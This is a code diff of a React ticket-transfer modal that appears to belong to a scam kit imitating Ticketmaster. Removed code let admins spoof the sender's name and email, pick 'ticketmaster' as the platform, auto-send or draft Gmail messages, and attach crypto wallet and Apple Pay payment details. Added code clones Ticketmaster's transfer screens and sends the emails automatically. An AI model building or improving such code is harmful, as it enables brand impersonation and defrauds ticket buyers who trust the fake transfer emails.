@@ -1,20 +1,17 @@
+"use client";
+
 import { useState, useEffect } from 'react';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import { 
     faTimes, 
-    faUserPlus, 
-    faKeyboard, 
-    faChevronRight, 
-    faCheckCircle, 
-    faPaperPlane, 
     faChevronLeft,
-    faSearch,
-    faEnvelope,
-    faPhone,
-    faUser
+    faChevronRight,
+    faCheckCircle, 
+    faInfoCircle,
+    faTag
 } from '@fortawesome/free-solid-svg-icons';
 import { useUser } from '../UserContext';
-import { Ticket, User } from '../types';
+import { Ticket } from '../types';
 
 interface TransferModalProps {
     isOpen: boolean;
@@ -22,73 +19,45 @@ interface TransferModalProps {
     ticket: Ticket | null;
 }
 
-type ViewState = 'options' | 'contacts' | 'manual' | 'confirm' | 'success';
+type ViewState = 'select' | 'form' | 'success';
 
 export default function TransferModal({ isOpen, onClose, ticket }: TransferModalProps) {
-    const { admin, users, fetchAllUsers } = useUser();
-    const [view, setView] = useState<ViewState>('options');
-    const [searchTerm, setSearchTerm] = useState('');
+    const { admin, fetchAllUsers } = useUser();
+    const [view, setView] = useState<ViewState>('select');
     const [loading, setLoading] = useState(false);
     const [error, setError] = useState<string | null>(null);
+    const [selectedSeats, setSelectedSeats] = useState<string[]>([]);
 
     // Form State
     const [formData, setFormData] = useState({
-        fullName: '',
-        emailAddress: '',
-        phoneNumber: '',
-        seatNumbers: '',
-        transferringSeatNumbers: '',
-        sendType: 'draft',
-        userPlatform: 'ticketmaster',
-        senderName: '',
-        senderEmail: ''
+        firstName: '',
+        lastName: '',
+        recipient: '',
+        note: ''
     });
-
-    const [applePayNumber, setApplePayNumber] = useState('');
-    const [btcWallet, setBtcWallet] = useState('');
-    const [ethWallet, setEthWallet] = useState('');
-    const [trcWallet, setTrcWallet] = useState('');
-    const [usdtWallet, setUsdtWallet] = useState('');
 
     useEffect(() => {
         if (isOpen) {
-            setView('options');
+            setView('select');
+            setSelectedSeats([]);
             setError(null);
-            if (ticket) {
-                setFormData(prev => ({
-                    ...prev,
-                    seatNumbers: ticket.seatNumbers || '',
-                    transferringSeatNumbers: '',
-                    senderName: prev.senderName || admin?.accountName || '',
-                    senderEmail: prev.senderEmail || admin?.accountEmail || ''
-                }));
-            }
+            setFormData({
+                firstName: '',
+                lastName: '',
+                recipient: '',
+                note: ''
+            });
         }
-    }, [isOpen, ticket]);
+    }, [isOpen]);
 
     if (!isOpen || !ticket) return null;
 
-    const filteredContacts = users.filter(u => 
-        u.fullName?.toLowerCase().includes(searchTerm.toLowerCase()) || 
-        u.emailAddress?.toLowerCase().includes(searchTerm.toLowerCase())
-    );
+    const seats = ticket.seatNumbers ? ticket.seatNumbers.split(',').map(s => s.trim()).filter(Boolean) : [ticket.seat || '1'];
 
-    // Deduplicate contacts by email
-    const uniqueContacts = Array.from(new Map(filteredContacts.map(item => [item.emailAddress, item])).values());
-
-    const handleContactSelect = (contact: User) => {
-        setFormData(prev => ({
-            ...prev,
-            fullName: contact.fullName,
-            emailAddress: contact.emailAddress,
-            phoneNumber: contact.phoneNumber || '',
-        }));
-        setView('confirm');
-    };
-
-    const handleManualSubmit = (e: React.FormEvent) => {
-        e.preventDefault();
-        setView('confirm');
+    const toggleSeat = (seat: string) => {
+        setSelectedSeats(prev => 
+            prev.includes(seat) ? prev.filter(s => s !== seat) : [...prev, seat]
+        );
     };
 
     const handleTransfer = async () => {
@@ -101,33 +70,17 @@ export default function TransferModal({ isOpen, onClose, ticket }: TransferModal
         try {
             const payload = new URLSearchParams();
             payload.append('action', 'transferTicket');
-            payload.append('fullName', formData.fullName);
-            payload.append('emailAddress', formData.emailAddress);
-            payload.append('phoneNumber', formData.phoneNumber);
-            payload.append('transferringSeatNumbers', formData.transferringSeatNumbers);
+            payload.append('fullName', `${formData.firstName} ${formData.lastName}`);
+            payload.append('emailAddress', formData.recipient);
+            payload.append('phoneNumber', '');
+            payload.append('transferringSeatNumbers', selectedSeats.join(', '));
             payload.append('ticketId', ticket.ticketId);
             payload.append('admin', admin.username);
-            payload.append('senderName', formData.senderName);
-            payload.append('senderEmail', formData.senderEmail);
-            payload.append('userPlatform', formData.userPlatform);
-            payload.append('sendType', formData.sendType);
-
-            let paymentSettingsObj: any = null;
-            if (applePayNumber || btcWallet || ethWallet || trcWallet || usdtWallet) {
-                paymentSettingsObj = {};
-                if (applePayNumber) paymentSettingsObj.applePayNumber = applePayNumber;
-                if (btcWallet || ethWallet || trcWallet || usdtWallet) {
-                    paymentSettingsObj.cryptoWallets = {};
-                    if (btcWallet) paymentSettingsObj.cryptoWallets.btc = btcWallet;
-                    if (ethWallet) paymentSettingsObj.cryptoWallets.eth = ethWallet;
-                    if (trcWallet) paymentSettingsObj.cryptoWallets.trc = trcWallet;
-                    if (usdtWallet) paymentSettingsObj.cryptoWallets.usdt = usdtWallet;
-                }
-            }
-
-            if (paymentSettingsObj) {
-                payload.append('paymentSettings', JSON.stringify(paymentSettingsObj));
-            }
+            payload.append('senderName', admin.accountName || admin.username);
+            payload.append('senderEmail', admin.accountEmail || 'user@virtualmail.com');
+            payload.append('userPlatform', 'ticketmaster');
+            payload.append('sendType', 'auto');
+            payload.append('note', formData.note);
 
             const response = await fetch(POST_URL, {
                 method: 'POST',
@@ -150,306 +103,140 @@ export default function TransferModal({ isOpen, onClose, ticket }: TransferModal
     };
 
     return (
-        <div className="fixed inset-0 z-[100] flex items-end justify-center bg-black/60 backdrop-blur-sm transition-opacity duration-300">
-            {/* Modal Container - Bottom Up Animation */}
-            <div className={`w-full max-w-lg bg-white rounded-t-[32px] overflow-hidden transition-transform duration-500 ease-out ${isOpen ? 'translate-y-0' : 'translate-y-full'}`}>
+        <div className={`fixed inset-0 z-[200] flex items-end justify-center bg-black/60 backdrop-blur-sm transition-opacity duration-300 ${isOpen ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
+            {/* Modal Container */}
+            <div className={`w-full max-w-lg bg-white rounded-t-[20px] shadow-2xl transition-transform duration-500 ease-out overflow-hidden flex flex-col ${isOpen ? 'translate-y-0' : 'translate-y-full'}`}>
                 
                 {/* Header */}
-                <div className="p-6 border-b border-gray-100 flex justify-between items-center bg-white sticky top-0 z-10">
-                    <div className="flex items-center">
-                        {view !== 'options' && view !== 'success' && (
-                            <button onClick={() => setView('options')} className="mr-4 text-gray-400 hover:text-black">
-                                <FontAwesomeIcon icon={faChevronLeft} />
-                            </button>
-                        )}
-                        <h2 className="text-xl font-black text-[#001B41]">
-                            {view === 'options' && 'Transfer To'}
-                            {view === 'contacts' && 'Select Contact'}
-                            {view === 'manual' && 'Enter Details'}
-                            {view === 'confirm' && 'Review Transfer'}
-                            {view === 'success' && 'Success!'}
-                        </h2>
-                    </div>
-                    <button onClick={onClose} className="w-8 h-8 flex items-center justify-center rounded-full bg-gray-50 text-gray-400 hover:text-black">
+                <div className="px-6 py-4 border-b border-gray-100 flex justify-center items-center relative">
+                    <h2 className="text-[12px] font-black text-[#1F1F1F] uppercase tracking-widest">
+                        {view === 'select' && 'Select Tickets to Transfer'}
+                        {view === 'form' && 'Transfer Tickets'}
+                        {view === 'success' && 'Success'}
+                    </h2>
+                    <button onClick={onClose} className="absolute right-6 text-gray-400 hover:text-black">
                         <FontAwesomeIcon icon={faTimes} />
                     </button>
                 </div>
 
                 {/* Content Area */}
-                <div className="p-6 max-h-[80vh] overflow-y-auto">
+                <div className="flex-1 overflow-y-auto max-h-[85vh]">
                     
-                    {/* View: Options */}
-                    {view === 'options' && (
-                        <div className="space-y-4">
-                            <button 
-                                onClick={() => setView('contacts')}
-                                className="w-full p-6 rounded-2xl border-2 border-gray-100 hover:border-[#026CDF] hover:bg-[#026CDF]/5 transition-all text-left flex items-center group"
-                            >
-                                <div className="w-12 h-12 rounded-full bg-[#026CDF]/10 text-[#026CDF] flex items-center justify-center mr-4 group-hover:scale-110 transition-transform">
-                                    <FontAwesomeIcon icon={faUserPlus} />
+                    {/* View: Selection */}
+                    {view === 'select' && (
+                        <div className="animate-in slide-in-from-bottom-4 duration-300">
+                            {/* Safety Banner */}
+                            <div className="px-6 py-4 flex items-start space-x-4 border-b border-gray-100">
+                                <div className="w-10 h-10 rounded-full bg-gray-500 flex items-center justify-center text-white shrink-0">
+                                    <FontAwesomeIcon icon={faInfoCircle} className="text-xl" />
                                 </div>
-                                <div className="flex-1">
-                                    <p className="font-black text-[#001B41]">Select from contacts</p>
-                                    <p className="text-xs font-bold text-gray-400">Choose from previous recipients</p>
-                                </div>
-                                <FontAwesomeIcon icon={faChevronRight} className="text-gray-200" />
-                            </button>
-
-                            <button 
-                                onClick={() => setView('manual')}
-                                className="w-full p-6 rounded-2xl border-2 border-gray-100 hover:border-[#001B41] hover:bg-gray-50 transition-all text-left flex items-center group"
-                            >
-                                <div className="w-12 h-12 rounded-full bg-gray-100 text-gray-400 flex items-center justify-center mr-4 group-hover:scale-110 transition-transform">
-                                    <FontAwesomeIcon icon={faKeyboard} />
-                                </div>
-                                <div className="flex-1">
-                                    <p className="font-black text-[#001B41]">Manually enter recipient</p>
-                                    <p className="text-xs font-bold text-gray-400">Enter email and name details</p>
-                                </div>
-                                <FontAwesomeIcon icon={faChevronRight} className="text-gray-200" />
-                            </button>
-                        </div>
-                    )}
-
-                    {/* View: Contacts */}
-                    {view === 'contacts' && (
-                        <div className="space-y-4">
-                            <div className="relative mb-6">
-                                <input 
-                                    type="text" 
-                                    placeholder="Search contacts..."
-                                    className="w-full p-4 pl-12 bg-gray-50 rounded-2xl border-none font-bold text-sm outline-none focus:ring-2 focus:ring-[#026CDF]"
-                                    value={searchTerm}
-                                    onChange={(e) => setSearchTerm(e.target.value)}
-                                />
-                                <FontAwesomeIcon icon={faSearch} className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-300" />
+                                <p className="text-sm font-bold text-[#1F1F1F] leading-tight pt-1">
+                                    Only transfer tickets to people you know and trust to ensure everyone stays safe
+                                </p>
                             </div>
-                            
-                            <div className="space-y-2">
-                                {uniqueContacts.length > 0 ? (
-                                    uniqueContacts.map((contact, i) => (
+
+                            {/* Ticket Info */}
+                            <div className="px-6 py-6">
+                                <div className="flex items-center justify-between mb-8">
+                                    <h3 className="text-lg font-black text-[#1F1F1F]">
+                                        Sec {ticket.section}, Row {ticket.row}
+                                    </h3>
+                                    <div className="flex items-center space-x-2">
+                                        <FontAwesomeIcon icon={faTag} className="text-gray-300 rotate-[-45deg]" />
+                                        <span className="text-sm font-black text-[#1F1F1F]">{seats.length} tickets</span>
+                                    </div>
+                                </div>
+
+                                {/* Seat Selection List */}
+                                <div className="flex space-x-4 overflow-x-auto pb-8 scrollbar-hide px-2">
+                                    {seats.map((seat, i) => (
                                         <button 
                                             key={i}
-                                            onClick={() => handleContactSelect(contact)}
-                                            className="w-full p-4 rounded-xl hover:bg-gray-50 flex items-center text-left transition-colors"
+                                            onClick={() => toggleSeat(seat)}
+                                            className="shrink-0 w-[110px] bg-white rounded-xl shadow-[0_8px_25px_rgba(0,0,0,0.1)] border border-gray-100 overflow-hidden group active:scale-95 transition-all"
                                         >
-                                            <div className="w-10 h-10 rounded-full bg-gray-100 flex items-center justify-center text-gray-400 mr-4">
-                                                <FontAwesomeIcon icon={faUser} />
+                                            <div className={`py-2 text-[10px] font-black uppercase tracking-widest text-center transition-colors ${selectedSeats.includes(seat) ? 'bg-[#026CDF] text-white' : 'bg-[#E5E7EB] text-gray-500'}`}>
+                                                Seat {seat}
                                             </div>
-                                            <div>
-                                                <p className="font-black text-[#001B41] text-sm">{contact.fullName}</p>
-                                                <p className="text-[10px] font-bold text-gray-400">{contact.emailAddress}</p>
+                                            <div className="py-6 flex justify-center">
+                                                <div className={`w-8 h-8 rounded-full border-2 transition-all flex items-center justify-center ${selectedSeats.includes(seat) ? 'border-[#026CDF] bg-[#026CDF]' : 'border-gray-200 bg-white'}`}>
+                                                    {selectedSeats.includes(seat) && <div className="w-2 h-2 bg-white rounded-full"></div>}
+                                                </div>
                                             </div>
                                         </button>
-                                    ))
-                                ) : (
-                                    <div className="text-center py-12">
-                                        <p className="font-bold text-gray-300">No contacts found</p>
-                                    </div>
-                                )}
+                                    ))}
+                                </div>
                             </div>
                         </div>
                     )}
 
-                    {/* View: Manual Entry */}
-                    {view === 'manual' && (
-                        <form onSubmit={handleManualSubmit} className="space-y-4">
-                                <div className="grid grid-cols-2 gap-4">
-                                    <div className="space-y-2">
-                                        <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest ml-1">Sender Name</label>
-                                        <input 
-                                            required
-                                            type="text"
-                                            className="w-full p-4 bg-gray-50 rounded-2xl border-none font-bold text-sm outline-none focus:ring-2 focus:ring-[#001B41]"
-                                            value={formData.senderName}
-                                            onChange={(e) => setFormData({...formData, senderName: e.target.value})}
-                                            placeholder="Your Name"
-                                        />
-                                    </div>
-                                    <div className="space-y-2">
-                                        <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest ml-1">Sender Email</label>
-                                        <input 
-                                            required
-                                            type="email"
-                                            className="w-full p-4 bg-gray-50 rounded-2xl border-none font-bold text-sm outline-none focus:ring-2 focus:ring-[#001B41]"
-                                            value={formData.senderEmail}
-                                            onChange={(e) => setFormData({...formData, senderEmail: e.target.value})}
-                                            placeholder="Your Email"
-                                        />
-                                    </div>
-                                </div>
-                                <div className="space-y-2">
-                                    <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest ml-1">Full Name</label>
+                    {/* View: Recipient Form */}
+                    {view === 'form' && (
+                        <div className="p-6 space-y-8 animate-in slide-in-from-right-4 duration-300">
+                            <div>
+                                <h3 className="text-lg font-black text-[#1F1F1F] mb-1">{selectedSeats.length} Tickets Selected</h3>
+                                <p className="text-xs font-bold text-gray-400">
+                                    Sec {ticket.section} Row {ticket.row} Seat {selectedSeats.join(', ')}
+                                </p>
+                            </div>
+
+                            <div className="space-y-6">
+                                <div className="space-y-1">
+                                    <label className="text-[11px] font-black text-[#1F1F1F] uppercase tracking-widest">First Name</label>
                                     <input 
-                                        required
                                         type="text"
-                                        className="w-full p-4 bg-gray-50 rounded-2xl border-none font-bold text-sm outline-none focus:ring-2 focus:ring-[#001B41]"
-                                        value={formData.fullName}
-                                        onChange={(e) => setFormData({...formData, fullName: e.target.value})}
-                                        placeholder="e.g. John Doe"
+                                        placeholder="First Name"
+                                        className="w-full p-4 bg-white border border-gray-200 rounded-md text-sm font-bold outline-none focus:border-[#026CDF]"
+                                        value={formData.firstName}
+                                        onChange={(e) => setFormData({...formData, firstName: e.target.value})}
                                     />
                                 </div>
-                            <div className="space-y-2">
-                                <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest ml-1">Email Address</label>
-                                <input 
-                                    required
-                                    type="email"
-                                    className="w-full p-4 bg-gray-50 rounded-2xl border-none font-bold text-sm outline-none focus:ring-2 focus:ring-[#001B41]"
-                                    value={formData.emailAddress}
-                                    onChange={(e) => setFormData({...formData, emailAddress: e.target.value})}
-                                    placeholder="john@example.com"
-                                />
-                            </div>
-                            <div className="space-y-2">
-                                <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest ml-1">Phone (Optional)</label>
-                                <input 
-                                    type="tel"
-                                    className="w-full p-4 bg-gray-50 rounded-2xl border-none font-bold text-sm outline-none focus:ring-2 focus:ring-[#001B41]"
-                                    value={formData.phoneNumber}
-                                    onChange={(e) => setFormData({...formData, phoneNumber: e.target.value})}
-                                    placeholder="+1 234 567 890"
-                                />
-                            </div>
-                            <button 
-                                type="submit"
-                                className="w-full bg-[#001B41] text-white py-4 rounded-2xl font-black text-sm mt-4 shadow-xl hover:scale-[1.02] transition-transform"
-                            >
-                                Continue to Review
-                            </button>
-                        </form>
-                    )}
-
-                    {/* View: Confirm */}
-                    {view === 'confirm' && (
-                        <div className="space-y-6">
-                            <div className="bg-gray-50 rounded-3xl p-6 border border-gray-100">
-                                <div className="flex items-center mb-6">
-                                    <div className="w-12 h-12 rounded-full bg-[#026CDF]/10 text-[#026CDF] flex items-center justify-center mr-4">
-                                        <FontAwesomeIcon icon={faPaperPlane} />
-                                    </div>
-                                    <div>
-                                        <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Recipent</p>
-                                        <p className="font-black text-[#001B41]">{formData.fullName}</p>
-                                    </div>
+                                <div className="space-y-1">
+                                    <label className="text-[11px] font-black text-[#1F1F1F] uppercase tracking-widest">Last Name</label>
+                                    <input 
+                                        type="text"
+                                        placeholder="Last Name"
+                                        className="w-full p-4 bg-white border border-gray-200 rounded-md text-sm font-bold outline-none focus:border-[#026CDF]"
+                                        value={formData.lastName}
+                                        onChange={(e) => setFormData({...formData, lastName: e.target.value})}
+                                    />
                                 </div>
-                                <div className="space-y-4">
-                                    <div className="flex justify-between items-center py-2 border-b border-gray-200/50">
-                                        <span className="text-xs font-bold text-gray-400">Email</span>
-                                        <span className="text-xs font-black text-[#001B41]">{formData.emailAddress}</span>
-                                    </div>
-                                    <div className="flex justify-between items-center py-2 border-b border-gray-200/50">
-                                        <span className="text-xs font-bold text-gray-400">Event</span>
-                                        <span className="text-xs font-black text-[#001B41] line-clamp-1">{ticket.eventName}</span>
-                                    </div>
-                                    <div className="py-2 border-b border-gray-200/50">
-                                        <p className="text-xs font-bold text-gray-400 mb-2">Select Seats to Transfer</p>
-                                        <div className="flex flex-wrap gap-2">
-                                            {ticket.seatNumbers?.split(',').map(s => s.trim()).filter(Boolean).map((seat, index) => {
-                                                const isSelected = formData.transferringSeatNumbers.split(',').map(s => s.trim()).includes(seat);
-                                                return (
-                                                    <button
-                                                        key={index}
-                                                        onClick={() => {
-                                                            const current = formData.transferringSeatNumbers ? formData.transferringSeatNumbers.split(',').map(s => s.trim()) : [];
-                                                            const next = current.includes(seat) ? current.filter(s => s !== seat) : [...current, seat];
-                                                            setFormData({...formData, transferringSeatNumbers: next.join(', ')});
-                                                        }}
-                                                        className={`px-3 py-1.5 rounded-lg text-[10px] font-black transition-all ${
-                                                            isSelected 
-                                                                ? 'bg-[#026CDF] text-white shadow-md' 
-                                                                : 'bg-white text-gray-400 border border-gray-200 hover:border-[#026CDF]'
-                                                        }`}
-                                                    >
-                                                        {seat}
-                                                    </button>
-                                                );
-                                            })}
-                                        </div>
-                                    </div>
-                                    <div className="flex justify-between items-center py-2">
-                                        <span className="text-xs font-bold text-gray-400">Transferring Seats</span>
-                                        <span className="text-xs font-black text-[#026CDF]">{formData.transferringSeatNumbers || 'None selected'}</span>
-                                    </div>
-                                    <div className="flex justify-between items-center py-1">
-                                        <span className="text-[10px] font-bold text-gray-300">Original Total</span>
-                                        <span className="text-[10px] font-black text-gray-300">{formData.seatNumbers}</span>
-                                    </div>
+                                <div className="space-y-1">
+                                    <label className="text-[11px] font-black text-[#1F1F1F] uppercase tracking-widest">Email or Mobile Number</label>
+                                    <input 
+                                        type="text"
+                                        placeholder="Email or Mobile Number"
+                                        className="w-full p-4 bg-white border border-gray-200 rounded-md text-sm font-bold outline-none focus:border-[#026CDF]"
+                                        value={formData.recipient}
+                                        onChange={(e) => setFormData({...formData, recipient: e.target.value})}
+                                    />
                                 </div>
-                            </div>
-
-                            {admin && (admin.role === 'OWNER' || admin.allowPayment === 'TRUE') && (
-                                <div className="bg-gray-50 rounded-3xl p-6 border border-gray-100">
-                                    <h3 className="text-sm font-black text-[#001B41] uppercase tracking-widest mb-4">Payment Configuration (Optional)</h3>
-                                    <div className="space-y-3">
-                                        <div>
-                                            <label className="text-[10px] font-bold text-gray-400 uppercase tracking-widest ml-1">Apple Pay Number</label>
-                                            <input type="text" value={applePayNumber} onChange={(e) => setApplePayNumber(e.target.value)} className="w-full p-3 bg-white rounded-xl border border-gray-100 text-sm font-bold outline-none focus:border-[#026CDF]" placeholder="e.g. +1234567890" />
-                                        </div>
-                                        <div>
-                                            <label className="text-[10px] font-bold text-gray-400 uppercase tracking-widest ml-1">Bitcoin (BTC) Wallet</label>
-                                            <input type="text" value={btcWallet} onChange={(e) => setBtcWallet(e.target.value)} className="w-full p-3 bg-white rounded-xl border border-gray-100 text-sm font-bold outline-none focus:border-[#026CDF]" placeholder="BTC Address" />
-                                        </div>
-                                        <div>
-                                            <label className="text-[10px] font-bold text-gray-400 uppercase tracking-widest ml-1">Ethereum (ETH) Wallet</label>
-                                            <input type="text" value={ethWallet} onChange={(e) => setEthWallet(e.target.value)} className="w-full p-3 bg-white rounded-xl border border-gray-100 text-sm font-bold outline-none focus:border-[#026CDF]" placeholder="ETH Address" />
-                                        </div>
-                                        <div>
-                                            <label className="text-[10px] font-bold text-gray-400 uppercase tracking-widest ml-1">Tron (TRC) Wallet</label>
-                                            <input type="text" value={trcWallet} onChange={(e) => setTrcWallet(e.target.value)} className="w-full p-3 bg-white rounded-xl border border-gray-100 text-sm font-bold outline-none focus:border-[#026CDF]" placeholder="TRC Address" />
-                                        </div>
-                                        <div>
-                                            <label className="text-[10px] font-bold text-gray-400 uppercase tracking-widest ml-1">Tether (USDT) Wallet</label>
-                                            <input type="text" value={usdtWallet} onChange={(e) => setUsdtWallet(e.target.value)} className="w-full p-3 bg-white rounded-xl border border-gray-100 text-sm font-bold outline-none focus:border-[#026CDF]" placeholder="USDT Address" />
-                                        </div>
-                                    </div>
+                                <div className="space-y-1">
+                                    <label className="text-[11px] font-black text-[#1F1F1F] uppercase tracking-widest">Note</label>
+                                    <textarea 
+                                        placeholder="Note"
+                                        className="w-full p-4 bg-white border border-gray-200 rounded-md text-sm font-bold outline-none focus:border-[#026CDF] h-24 resize-none"
+                                        value={formData.note}
+                                        onChange={(e) => setFormData({...formData, note: e.target.value})}
+                                    />
                                 </div>
-                            )}
-
-                            <div className="space-y-4">
-                                <div className="flex items-center justify-between p-4 bg-gray-50 rounded-2xl">
-                                    <label className="text-xs font-black text-[#001B41]">Transfer Mode</label>
-                                    <select 
-                                        className="bg-transparent font-black text-xs text-[#026CDF] outline-none"
-                                        value={formData.sendType}
-                                        onChange={(e) => setFormData({...formData, sendType: e.target.value})}
-                                    >
-                                        <option value="draft">Save as Draft</option>
-                                        <option value="auto">Send Automatically</option>
-                                    </select>
-                                </div>
-                                
-                                {error && <p className="text-red-500 text-[10px] font-bold text-center">{error}</p>}
-
-                                <button 
-                                    onClick={handleTransfer}
-                                    disabled={loading}
-                                    className="w-full bg-[#026CDF] text-white py-4 rounded-2xl font-black text-sm shadow-xl shadow-[#026CDF]/20 flex items-center justify-center hover:scale-[1.02] transition-transform disabled:opacity-50"
-                                >
-                                    {loading ? (
-                                        <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
-                                    ) : (
-                                        'Confirm Transfer'
-                                    )}
-                                </button>
                             </div>
                         </div>
                     )}
 
                     {/* View: Success */}
                     {view === 'success' && (
-                        <div className="py-12 text-center">
-                            <div className="w-20 h-20 bg-[#026CDF]/10 text-[#026CDF] rounded-full flex items-center justify-center mx-auto mb-6 animate-bounce">
+                        <div className="py-20 text-center animate-in zoom-in duration-500">
+                            <div className="w-20 h-20 bg-green-100 text-green-500 rounded-full flex items-center justify-center mx-auto mb-6">
                                 <FontAwesomeIcon icon={faCheckCircle} className="text-4xl" />
                             </div>
-                            <h3 className="text-2xl font-black text-[#001B41] mb-2">Transfer Initiated!</h3>
-                            <p className="text-gray-400 font-bold mb-8 px-6">
-                                {formData.sendType === 'draft' 
-                                    ? `A draft has been created in your Gmail for ${formData.fullName}.` 
-                                    : `An invitation email has been sent to ${formData.emailAddress}.`}
+                            <h3 className="text-2xl font-black text-[#1F1F1F] mb-2">Transfer Sent!</h3>
+                            <p className="text-gray-400 font-bold px-12">
+                                Your tickets have been sent to {formData.firstName} {formData.lastName}.
                             </p>
                             <button 
                                 onClick={onClose}
-                                className="w-full bg-[#001B41] text-white py-4 rounded-2xl font-black text-sm"
+                                className="mt-10 px-12 py-3 bg-[#1F1F1F] text-white rounded-md font-black text-sm uppercase tracking-widest"
                             >
                                 Done
                             </button>
@@ -457,13 +244,44 @@ export default function TransferModal({ isOpen, onClose, ticket }: TransferModal
                     )}
                 </div>
 
-                {/* Footer Disclaimer */}
+                {/* Footer Controls */}
                 {view !== 'success' && (
-                    <div className="p-6 bg-gray-50 border-t border-gray-100">
-                        <p className="text-[10px] text-gray-400 font-bold text-center leading-relaxed">
-                            By continuing, you agree to the Ticketmaster Ticket Transfer Terms. 
-                            Transferred tickets cannot be retracted once accepted by the recipient.
-                        </p>
+                    <div className="px-6 py-6 border-t border-gray-100 bg-white">
+                        {view === 'select' ? (
+                            <div className="flex items-center justify-between">
+                                <span className="text-sm font-bold text-gray-500">
+                                    {selectedSeats.length} Selected
+                                </span>
+                                <button 
+                                    onClick={() => selectedSeats.length > 0 && setView('form')}
+                                    disabled={selectedSeats.length === 0}
+                                    className={`text-[12px] font-black uppercase tracking-widest flex items-center transition-colors ${selectedSeats.length > 0 ? 'text-[#026CDF]' : 'text-gray-300'}`}
+                                >
+                                    Transfer To <FontAwesomeIcon icon={faChevronRight} className="ml-2" />
+                                </button>
+                            </div>
+                        ) : (
+                            <div className="flex items-center justify-between">
+                                <button 
+                                    onClick={() => setView('select')}
+                                    className="text-[11px] font-black text-[#026CDF] uppercase tracking-widest flex items-center"
+                                >
+                                    <FontAwesomeIcon icon={faChevronLeft} className="mr-2" /> Back
+                                </button>
+                                <button 
+                                    onClick={handleTransfer}
+                                    disabled={loading || !formData.recipient || !formData.firstName}
+                                    className="bg-[#026CDF] text-white px-8 py-3 rounded-md font-black text-[12px] uppercase tracking-widest shadow-lg shadow-[#026CDF]/20 disabled:opacity-50 transition-all flex items-center"
+                                >
+                                    {loading ? (
+                                        <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
+                                    ) : (
+                                        `Transfer ${selectedSeats.length} Tickets`
+                                    )}
+                                </button>
+                            </div>
+                        )}
+                        {error && <p className="mt-4 text-[10px] font-bold text-red-500 text-center">{error}</p>}
                     </div>
                 )}
             </div>
